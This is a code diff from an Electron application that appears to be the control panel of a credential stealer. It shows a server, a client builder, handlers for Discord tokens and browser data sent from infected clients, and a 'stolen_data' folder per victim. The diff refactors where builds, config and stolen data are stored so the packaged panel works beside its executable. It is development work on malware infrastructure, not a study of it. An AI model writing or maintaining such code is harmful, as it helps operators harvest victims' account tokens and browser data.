@@ -5,9 +5,14 @@ const os = require('os');
 const VortexServer = require('./server');
 const ClientBuilder = require('./builder');
 
+const rootPath = app.isPackaged ? path.dirname(process.execPath) : __dirname;
+const buildsPath = path.join(rootPath, 'builds');
+const stolenDataPath = path.join(rootPath, 'stolen_data');
+const configPath = path.join(rootPath, 'config.json');
+
 let mainWindow;
 const server = new VortexServer();
-const builder = new ClientBuilder(path.join(__dirname, 'builds'));
+const builder = new ClientBuilder(buildsPath);
 
 function createWindow() {
   mainWindow = new BrowserWindow({
@@ -121,9 +126,8 @@ ipcMain.handle('build-client', async (event, config) => {
 });
 
 ipcMain.handle('open-builds-folder', () => {
-  const buildsDir = path.join(__dirname, 'builds');
-  if (!fs.existsSync(buildsDir)) fs.mkdirSync(buildsDir, { recursive: true });
-  shell.openPath(buildsDir);
+  if (!fs.existsSync(buildsPath)) fs.mkdirSync(buildsPath, { recursive: true });
+  shell.openPath(buildsPath);
   return true;
 });
 
@@ -149,13 +153,11 @@ ipcMain.handle('save-file', async (event, filename, base64Data) => {
 });
 
 ipcMain.handle('save-config', (event, config) => {
-  const configPath = path.join(__dirname, 'config.json');
   fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
   return true;
 });
 
 ipcMain.handle('load-config', () => {
-  const configPath = path.join(__dirname, 'config.json');
   if (fs.existsSync(configPath)) {
     return JSON.parse(fs.readFileSync(configPath, 'utf8'));
   }
@@ -250,7 +252,7 @@ server.on('discord-tokens', (clientId, data) => {
 });
 
 server.on('browser-data', (clientId, items) => {
-  const baseDir = path.join(__dirname, 'stolen_data', clientId);
+  const baseDir = path.join(stolenDataPath, clientId);
   let savedCount = 0;
   
   try {
